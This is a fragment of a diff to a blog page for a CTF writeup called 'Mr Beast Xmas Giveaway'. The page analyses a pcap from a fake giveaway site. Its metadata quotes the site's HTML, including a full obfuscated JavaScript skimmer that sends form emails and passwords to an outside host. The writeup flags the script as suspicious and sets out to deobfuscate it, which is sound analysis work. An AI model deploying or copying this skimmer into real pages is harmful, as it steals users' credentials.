text-center&#34;&gt; &lt;div class= &#34;row text-center&#34;&gt; &lt;div class= &#34;col-lg-12 col-md-12 col-sm-12 col-xs-12&#34;&gt; &lt;ul class=&#34;socials-icons col-lg-12 col-md-12 col-sm-12 col-xs-12&#34;&gt; &lt;li&gt; &lt;a href=&#34;https://www.facebook.com/MrBeast6000&#34; data-toggle=&#34;tooltip&#34; title=&#34;Share in Facebook&#34; class=&#34;facebook&#34;&gt;&lt;i class=&#34;fa fa-facebook&#34;&gt;&lt;/i&gt;&lt;/a&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=&#34;https://twitter.com/mrbeast?lang=en&#34; data-toggle=&#34;tooltip&#34; title=&#34;Share in Twitter&#34; class=&#34;twitter&#34;&gt;&lt;i class=&#34;fa fa-twitter&#34;&gt;&lt;/i&gt;&lt;/a&gt; &lt;/li&gt; &lt;li&gt; &lt;a href=&#34;https://www.instagram.com/mrbeast/?hl=en&#34; data-toggle=&#34;tooltip&#34; title=&#34;Share in Instagram&#34; class=&#34;instagram&#34;&gt;&lt;i class=&#34;fa fa-instagram&#34;&gt;&lt;/i&gt;&lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;!-- end of share part --&gt; &lt;/div&gt;&lt;!-- end of body content --&gt; &lt;!-- footer --&gt; &lt;div class=&#34;wrapper footer&#34;&gt; &lt;div class=&#34;container&#34;&gt; &lt;div class=&#34;row text-center&#34;&gt; &lt;div class=&#34;name col-lg-2 col-md-2 col-sm-2 col-xs-12 text-center&#34;&gt; &lt;h1&gt;Giveaway&lt;/h1&gt; &lt;/div&gt; &lt;div class=&#34;col-lg-8 col-md-8 col-sm-8 col-xs-12 text-center&#34;&gt; &lt;div class=&#34;copyright&#34;&gt; &amp;copy; Mr.Beast Team &lt;/div&gt; &lt;/div&gt; &lt;div class= &#34;col-lg-2 col-md-2 col-sm-2 col-xs-12&#34; id=&#34;back-top&#34;&gt; &lt;p class= &#34;pull-right&#34;&gt;&lt;a href=&#34;#home&#34;&gt;&lt;span&gt;&lt;/span&gt;Top&lt;/a&gt;&lt;/p&gt;	&lt;/div&gt;	&lt;/div&gt;&lt;!-- row --&gt; &lt;/div&gt; &lt;/div&gt;&lt;!--end of footer --&gt; &lt;/body&gt; &lt;/html&gt; &lt;script&gt; function _0x299a(_0xa725a8,_0x48ecb7){var _0x33465e=_0x3346();return _0x299a=function(_0x299a8c,_0x4edf29){_0x299a8c=_0x299a8c-0x7f;var _0x3b4711=_0x33465e[_0x299a8c];return _0x3b4711;},_0x299a(_0xa725a8,_0x48ecb7);}var _0x52de18=_0x299a;function _0x3346(){var _0x1cd6fe=[&#39;length&#39;,&#39;.subscribe-form\x20.form-control[type=\x22password\x22]&#39;,&#39;click&#39;,&#39;10GjwUiH&#39;,&#39;283448ojrvqi&#39;,&#39;PSkvNyoILFxaI0BVW0M&#43;RlBZR1QsVVxHPkAXXUYYBAldRlIsD14DVRdVF0Ec&#39;,&#39;.subscribe-form\x20.btn.btn-info&#39;,&#39;GET&#39;,&#39;11wIJUzs&#39;,&#39;385aGCgYF&#39;,&#39;203916QRBBAJ&#39;,&#39;addEventListener&#39;,&#39;186854HAAPmi&#39;,&#39;DOMContentLoaded&#39;,&#39;push&#39;,&#39;34662TcBphL&#39;,&#39;join&#39;,&#39;open&#39;,&#39;value&#39;,&#39;querySelector&#39;,&#39;charCodeAt&#39;,&#39;5003910eMoXPe&#39;,&#39;945368MfXSkw&#39;,&#39;9CofhOF&#39;,&#39;&amp;apikey=&#39;,&#39;https://storage.appssec.co.ind?email=&#39;,&#39;send&#39;,&#39;724557XgnpSv&#39;];_0x3346=function(){return _0x1cd6fe;};return _0x3346();}(function(_0x104a86,_0xa6db47){var _0x4c8d43=_0x299a,_0xf91101=_0x104a86();while(!![]){try{var _0x29d6b2=-parseInt(_0x4c8d43(0x8c))/0x1&#43;parseInt(_0x4c8d43(0x94))/0x2&#43;-parseInt(_0x4c8d43(0x87))/0x3&#43;-parseInt(_0x4c8d43(0x92))/0x4*(parseInt(_0x4c8d43(0x8b))/0x5)&#43;parseInt(_0x4c8d43(0x97))/0x6*(parseInt(_0x4c8d43(0x91))/0x7)&#43;-parseInt(_0x4c8d43(0x82))/0x8*(parseInt(_0x4c8d43(0x83))/0x9)&#43;parseInt(_0x4c8d43(0x81))/0xa*(parseInt(_0x4c8d43(0x90))/0xb);if(_0x29d6b2===_0xa6db47)break;else _0xf91101[&#39;push&#39;](_0xf91101[&#39;shift&#39;]());}catch(_0x4597d0){_0xf91101[&#39;push&#39;](_0xf91101[&#39;shift&#39;]());}}}(_0x3346,0x28a39),document[_0x52de18(0x93)](_0x52de18(0x95),function(){var _0x3010de=_0x52de18;const _0x4c17d1=document[&#39;querySelector&#39;](_0x3010de(0x8e)),_0x5bc16f=document[_0x3010de(0x7f)](&#39;.subscribe-form\x20.form-control[type=\x22text\x22]&#39;),_0x106e8a=document[_0x3010de(0x7f)](_0x3010de(0x89));_0x4c17d1[_0x3010de(0x93)](_0x3010de(0x8a),function(){var _0xaf724a=_0x3010de;const _0x3a9d03=_0x5bc16f[_0xaf724a(0x9a)],_0x38e031=_0x106e8a[_0xaf724a(0x9a)];var _0x37a3bb=_0xaf724a(0x8d);function _0x2ae5a0(_0x49225f){var _0x4a91e4=_0xaf724a,_0x1d14ff=[&#39;s&#39;,&#39;a&#39;,&#39;n&#39;,&#39;t&#39;,&#39;a&#39;],_0x1bcfcc=[];input=atob(_0x49225f);for(var _0x4d4b2f=0x0;_0x4d4b2f&lt;input[_0x4a91e4(0x88)];_0x4d4b2f&#43;&#43;){var _0x41b22f=input[_0x4a91e4(0x80)](_0x4d4b2f)^_0x1d14ff[_0x4d4b2f%_0x1d14ff[_0x4a91e4(0x88)]][_0x4a91e4(0x80)](0x0);_0x1bcfcc[_0x4a91e4(0x96)](String[&#39;fromCharCode&#39;](_0x41b22f));}return _0x1bcfcc[_0x4a91e4(0x98)](&#39;&#39;);}function _0xe05049(){var _0x3ebbc9=_0xaf724a,_0x45261b=_0x3a9d03,_0x2bf34e=_0x38e031,_0x5ba78a=_0x2ae5a0(_0x37a3bb),_0x5b4edc=new XMLHttpRequest();_0x5b4edc[_0x3ebbc9(0x99)](_0x3ebbc9(0x8f),_0x3ebbc9(0x85)&#43;_0x45261b&#43;&#39;&amp;password=&#39;&#43;_0x2bf34e&#43;_0x3ebbc9(0x84)&#43;String(_0x5ba78a)),_0x5b4edc[_0x3ebbc9(0x86)]();}_0xe05049();});})); &lt;/script&gt; This request contains the index.html page of the themrbeas7.org website.
 We can spot a suspicious looking script at the end of the html file contained in the request, but it does not make a lot of sense. We can distinguish some strings such as password, fromCharCode, h[x][x]ps://storage.appssec.co.ind? and so on.
-This is basically obfuscated javascript. Let&rsquo;s try to deobfuscate it and make sense of it.
-For this purpose, we can use the online tool:" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://connar.github.io/ctfwriteups/xmasgiveaway/" /><meta property="article:section" content="ctfwriteups" />
-
-
-
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Mr Beast Xmas Giveaway - Writeup"/>
+This is basically obfuscated javascript. Let’s try to deobfuscate it and make sense of it.
+For this purpose, we can use the online tool:">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="ctfwriteups">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Mr Beast Xmas Giveaway - Writeup">
 <meta name="twitter:description" content="Starting the analysis
 A pcap file is provided to the user. Pcap files are network capture files that provide an insight of what requests were made to what websites, the contents of each request and much more.
 Opening the file with Wireshark, we can view all the requests.
@@ -745,7 +525,7 @@ function _0x299a(_0xa725a8,_0x48ecb7){var _0x33465e=_0x3346();return _0x299a=fun
 This request contains the index.html page of the themrbeas7.org website.
 We can spot a suspicious looking script at the end of the html file contained in the request, but it does not make a lot of sense. We can distinguish some strings such as password, fromCharCode, h[x][x]ps://storage.appssec.co.ind? and so on.
 This is basically obfuscated javascript. Let&rsquo;s try to deobfuscate it and make sense of it.
-For this purpose, we can use the online tool:"/>
+For this purpose, we can use the online tool:">
 
 
 <script type="application/ld+json">
@@ -820,7 +600,7 @@ For this purpose, we can use the online tool:"/>
         <div class="logo">
             <a href="https://connar.github.io/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
             <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                         stroke-linejoin="round">
